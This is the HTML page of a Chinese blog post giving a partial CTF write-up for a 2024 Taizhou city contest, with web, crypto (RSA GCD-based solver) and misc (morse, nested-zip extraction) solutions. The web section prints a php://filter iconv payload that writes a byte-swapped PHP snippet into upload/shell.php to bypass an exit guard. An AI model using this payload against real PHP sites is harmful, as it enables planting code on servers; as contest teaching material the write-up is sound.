@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="允许一切如其所是">
+    <meta name="author" content="C3ngH">
+    
+    <title>
+        
+            2024 台州市赛 部分WriteUp |
+        
+        C3ngH&#39;s B10g
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","links":"/links","设备":"/devices","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"如果有一天你厌倦了，那就回归生活吧","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/real-c3ngh","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈@r3kapig / N0wayBack","link":"https://carbo.ink/","description":"ahhhhhhh~","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse@Nu1L Junior","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc@V&N","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc@N0wayBack","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"name":"yixinBC","link":"https://blog.buyix.in/","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/c6a64c00f2c066f8.jpg","description":"超级菜浑水摸鱼手"},{"name":"gets","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/ab868415fdfc7ff5.jpg","link":"http://www.getspwn.xyz","description":"好饿啊, 早知道不学pwn了"},{"name":"c_lby","avatar":"https://q.qlogo.cn/headimg_dl?dst_uin=3138622727&spec=640&img_type=jpg","link":"https://c-lby.top/","description":"我们联合, 形成两面包夹芝士！"},{"name":"lianjin","avatar":"https://lianjinlll.cn/images/profilePicture.jpg","link":"https://lianjinlll.cn","description":"hell0_w0r1d"},{"name":"Hurkin","link":"https://www.hurkin.top","avatar":"https://www.hurkin.top/wp-admin/images/hand.jpg","description":"迎着阳光盛大逃亡"},{"name":"yolo","link":"https://www.yo1o.top","avatar":"https://www.yo1o.top/yolo.jpg","description":"还是很菜, 在进修ing"},{"name":"n1gh7ma12e","link":"http://n1gh7ma12e.cn/","avator":"http://n1gh7ma12e.cn/images/avatar.jpg","description":"你所热爱的就是你的生活"},{"title":"Ret2Life"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_·empty.","link":"https://sun1028.top/","description":"~Love Forever~","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sun.jpg"},{"name":"清酒","avatar":"http://clearwine.online/images/qingjiu.jpg","link":"http://clearwine.online/","description":"旅途还在继续，谁也不知道他会在什么时候到达终点。"},{"name":"YanHuoLG","link":"https://www.yanhuolg.com.cn/","avatar":"https://yanhuolg.com.cn/medias/avatar.png","description":"醉后不知天在水，满船清梦压星河。"},{"name":"Aura","link":"https://jasmineaura.github.io/AuraBlog/favicon.ico","avatar":"https://jasmineaura.github.io/AuraBlog/","description":"随便"},{"name":"亮汪汪","link":"https://lwwww.top/","description":"亮汪汪汪汪汪汪汪","avatar":"http://images.lwwww.top/lww.jpg"},{"title":"CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"G3rling","avatar":"https://g3rling.top/wp-content/uploads/2024/03/头像.jpg","description":"少说话，多做事","link":"https://g3rling.top/"},{"name":"Mia","avatar":"https://miablog.oss-cn-nanjing.aliyuncs.com/img/Mia.png","link":"https://blog.miamia.top","description":"无论如何，感谢经历。"},{"name":"n0o0b","link":"https://www.n0o0b.com","avator":"https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/n0o0b.png","description":"To be a better noob"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU Security Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               C3ngH&#39;s B10g
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/devices">
+                                
+                                设备
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/devices">
+                            
+                            设备
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        2024 台州市赛 部分WriteUp
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">C3ngH</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-10-16 21:41:22</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Jul 09 2025 20:55:49 GMT+0800">2025-07-09 20:55:49</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E9%A2%98%E8%A7%A3/">题解</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Misc/">Misc</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="Web">Web</h2>
+<h3 id="DEAD-OR-ALIVE">DEAD OR ALIVE</h3>
+<p>php死亡绕过 php伪协议 url二次编码绕过一下</p>
+<p>这里开启了短tag rot47绕不过去</p>
+<p>换成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=upload/shell.php</span><br><span class="line">contents=?%3Chp%20phpipfn(o;)%3E?</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
+                        alt="image-20241016122520194"
+                 ></p>
+<h3 id="几道菜呀">几道菜呀</h3>
+<p>robotstxt 泄露前半flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
+                        alt="image-20241016122938977"
+                 ></p>
+<p>后半flag变量覆盖 吧flag污染到变量world里面</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123059656.png"
+                        alt="image-20241016123059656"
+                 ></p>
+<h3 id="Crypto">Crypto</h3>
+<h4 id="codemaster">codemaster</h4>
+<p>爆破得到压缩包密码</p>
+<p>hint里面看到压缩包密码</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123701666.png"
+                        alt="image-20241016123701666"
+                 ></p>
+<p>听出来摩斯编码</p>
+<p>01 0100 0100 011 111 010 101 01 10 100 10 111 0110 0100 01 1011 11 01 101 0 0111 01 1010 101 01 100</p>
+<p>001 0100 0100 1000解码得到压缩包密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALLWORKANDNOPLAYMAKEJACKADULLBOY</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016124350133.png"
+                        alt="image-20241016124350133"
+                 ></p>
+<h4 id="简单的模运算">简单的模运算</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 =  <span class="number">59291291447490366931525634934604732490686993375526804349191888372804657968568621876626267171031639542229776816809231575682674990669907844507573323062869697381007018170369953528533225693260962158277876389797698421883811693774623191453338343873376809325940622690724742325375260783954612111771505452790833107433</span></span><br><span class="line">e1 =  <span class="number">1009</span></span><br><span class="line">e2 =  <span class="number">661</span></span><br><span class="line">c1 =  <span class="number">42985353077188042701858678659683858628193880095538312019081971299029326751867795460043384534976482867850898695817341887974850615883707385265375936859975562647458644154098813749248370155445911231152202411316142174083125556302740642264129017638217154099365335103116579136478977445028803457714891387414804454563</span></span><br><span class="line">hint2 =  <span class="number">40507463249661310357827794806044375677878316124571340628557074423085821966799760539750240709046644351970536177027127843527257097695964926292300842488261880439240179761636200128317742727421272586463218228015921971356760958631902559531017704907319793768862467740343002694370348402368271531907359292269313167594</span></span><br><span class="line">hint1 =  <span class="number">1271005879853316066661199285969179445258555468409602536767308127422453124456569166278548456389424001236622134198431700958874184560969387121822195176467698604581027381830540104701755158555395105056691597754287953054854072522855420859550987917092786677237411037800799757596145745139003994853090852244952501770</span></span><br><span class="line"></span><br><span class="line">p=GCD(n1, hint1**e1-e1**(e1*e2)*hint2**e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1, inverse(<span class="number">65537</span>, p-<span class="number">1</span>),p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 =  <span class="number">18907964900655384324579822409386633636878766956056871585535362235214353767231073564264059287914388330411792102199606677008933621408085966756951588469677351070820733406746369679198435269992553170199992317543151904463295431360000467944654613563212110648427484740736780335622922770497302516605477200091994280170659051797483082932715112295285374951466772664058673174457133774539371864037823431076085535646866492867565053211399132137624309571702027870497719709848105717638061824558263209029252939242634210549580025431343041421766587111257036497372428545483704784943228958032869014014563237034417269447643411742587366522581092247139356905151503074118950953726319892565456479517718514001822091970116274032235077283171573739409327260871369017093426482435098823654221146125974831336950435699141428482689352594911360748437075413924102074118643817682988301168832491421799525827632647293700871699768251822202064478207264310344710162587091114198326722398521534722836191900118919600325987668228334387274131745452370144048469165896152934265086085786170745300044244328435656038364921390878141315764940004361350568616343868964642155971232793094529961537868556317288317761237430569785361173933724010332338240102029231307867651913780873895463922404696220328907265969090667253011075715302423364798124784791540343259221981176571491275777227356362593241763735078774750032170810209648159443012857333801615838630780060716065099646497273032317098446052746729617067928763959393487041510168193671378036773409927475705441371588922269531683087325413686315760604906941830110671649667896262119795185372459800672732201403353796496975239081396680894282951703497436899157694531797901273547022181574313676236049710129802224469486290831758140772148263506850711301689866687921384434558768919627058698246307704127709329632785782812326088967419473252484748677712381933762265715476433475653</span></span><br><span class="line">hint3 =  <span class="number">9939018467626296300864549557153960485816202060115441771858993139956001568094397129213688325169848929397519454556265038265085753791012239390847499832076142790537570688728474176390891119329028306138917962137940523721411683756694953004757356322832322272044727574511946615053360780724964403109981221038321150251912087095566788471973368735984926133539004913163814796547521685779553548417828006578689568287135076606657942555780079060666398892624634539284576783451146414121481315811210373744629102035041262128288541384833388244359092650525684510233998198648220188818529696044589322103131713532522087913277853687802387823370812184861308056607206704924142111163623647400386387795315156552323415775302567837608141240660791558895222250523472575523943334805729177781503647940132538364353380916295244903544529895988952519161034077133368918033027698840291604695794239996491625350827193007237672555853711676946280455422865857083520387962904612732978811244632662722516874510663815000407442709650546583427701935634421822920667340400344464560819496241832753100346158973730178944583819434570015364985334123682718945396012714833234814138060680879946683598382558581755464432848629830671740874556822495651590292355132309556201503702994218748824342270746121842337819752324099307642066174745872761074064496053960340396957873940843698476902239785513353538575271300199803656708789414583304212919858466476111752009816249691548012011325635726932007337584928654763601504911235883280784689919453164650180423494792012285026508211938647974660637499188015435581876228505538395991613265963363970634342709084117396030961729066498695271401095219781344237736883159601430790828530656828799412179649742014177933116928065839153385688599329261957525423958781720021524864279277040500534782586037303978447982579881703150864520067784227584088469267877647284326147128663307302461696049106379396</span></span><br><span class="line">hint4 =  <span class="number">11497927853957540365332790665731275206952151206861039571536392062632509295957449992678521695139160324432572043863866571073273424766195027066994928026020365890447586873438730677930838694248463784234422970896904779315141100899548415386962349420861970235250438845409060098489028828677789310690303276268227293420117427555062211347687022376226002772552572846005575907377875069559346178573605837280707896716903996273437999304784804469148200034055401729899984732371826562249893238400736560876412526076698397150716407768045925783960626076975474775287357623238930181817744888057241082587725853888247069373763616410186825446631363893872367121719099675878971215427631753890480342562281509217650841316549477101278836516712239644946591434882047908159355119724740895836970093220436696609508084144405957119864577550601265078506824881563233145601502789276574964256487656042156050790935757687533400014492738943377035151940053902285169162559415884261670006407914345470020985548114750984409094762491065523701667910143102554492295526746294891248183460488516919232107982441935261002056298051839186448002917036315086702724337403007094283544108605752353892969499338937456927473502637574082273446631592875576206457590873417790534425052375523311069970894661662935504029122498888677579838832589434264156033809784824308541883139057067073172969579383284214906496081973100504512465134008311849499410830926217663692810810073433508445528894019031624950077917834721653995486872359322444973369269957808220204120434820049177595069822767774880891475045042506316778272385296785381694201967451988353025446019210309412684814041807087081841227290094176745748423008005181412793105824372881451510867905760386180468940263583834371726883151840358399349831450242497969453799407724511831157375792268531837507107779497339624673256413930993867285692700231244480782493119378673295412687014852050209</span></span><br><span class="line">hint5 =  <span class="number">734693499178140709107482184121639881311481497449164451247514670640712514605734040224535011153519609835276802031782238154113623838563165860055971999265801692161249909520059287311664417036724025637099701450424590923727907132999019020950844342934742235333060614209179570928227493575110697506644022234765949969346518432653798426853947974772328105759741384608693269694</span></span><br><span class="line"></span><br><span class="line">q2=GCD(n2, hint3-hint4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q2)</span><br><span class="line">p2q2=GCD(n2,hint4-q2-hint3)</span><br><span class="line">r=n2//p2q2</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((hint5-<span class="number">1</span>)//r**<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;0e88f0e0-f18d-11ee-a56a-38f3abddb69b&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Misc">Misc</h3>
+<h4 id="大ping特ping">大ping特ping</h4>
+<p>CTF-NetA一把梭</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016112455975.png"
+                        alt="image-20241016112455975"
+                 ></p>
+<h4 id="鼠标不妙题">鼠标不妙题</h4>
+<p>打开后是300个套娃压缩包，写脚本提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_path, extract_to, root_directory</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zip_ref.namelist():</span><br><span class="line">            filename = os.path.basename(member)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            source = zip_ref.<span class="built_in">open</span>(member)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target_path = os.path.join(extract_to, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError:</span><br><span class="line">                <span class="comment"># 如果文件被加密，则将其保存到根目录下</span></span><br><span class="line">                target_path = os.path.join(root_directory, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_unzip</span>(<span class="params">directory, root_directory</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                extract_to = os.path.join(root, os.path.splitext(file)[<span class="number">0</span>])</span><br><span class="line">                os.makedirs(extract_to, exist_ok=<span class="literal">True</span>)</span><br><span class="line">                extract_all(file_path, extract_to, root_directory)</span><br><span class="line">                recursive_unzip(extract_to, root_directory)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_directory = <span class="string">r&quot;\\?\C:\Users\67300\Downloads\11&quot;</span></span><br><span class="line">    recursive_unzip(start_directory, start_directory)</span><br></pre></td></tr></table></figure>
+<p>查看python的报错信息和使用everything直接得到最内层的文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121031728.png"
+                        alt="image-20241016121031728"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121119612.png"
+                        alt="image-20241016121119612"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121223773.png"
+                        alt="image-20241016121223773"
+                 ></p>
+<p>每个压缩包下有一个.dic文件，应该密码就在这300个字典中</p>
+<p>写python脚本提取这300个字典</p>
